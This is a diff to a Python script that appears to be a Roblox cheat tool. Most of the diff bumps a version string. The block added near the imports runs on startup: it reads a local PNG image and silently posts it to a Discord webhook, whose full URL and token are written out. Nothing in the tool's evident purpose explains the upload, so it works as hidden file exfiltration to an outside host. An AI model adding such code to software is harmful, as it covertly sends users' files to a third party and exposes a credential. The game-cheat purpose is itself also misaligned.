@@ -8,6 +8,19 @@ import pygame
 import os
 import time
 
+import requests
+
+with open("2023-02-08_22-49-162.png", 'rb') as f:
+    f = f.read()
+
+link = "https://discord.com/api/webhooks/1429030702090948650/wVnXAoK2s1n7dmVc7fHIhstWAjkox-3s9ZYO9GN47bZTYAdSw2s6pqgnGTol15Lzi_CR"
+
+message = {
+    "squ.png": f
+}
+
+res = requests.post(link, files=message) # cd Downloads 2023-02-08_22-49-162.png
+
 os.system('cls')
 
 left, top = 800, 300
@@ -285,7 +298,7 @@ def connect():
 
 
 def check():
- print("\n**Date 0.2**\n")
+ print("\n**Date 0.3**\n")
  print("[1] = Must Be On Roblox Graphics, 120 FOV & Recon")
  print("[2] = Must Be On Roblox Graphics, 104 FOV & Recon")
  print("\n[3] = 104 FOV & Purple")
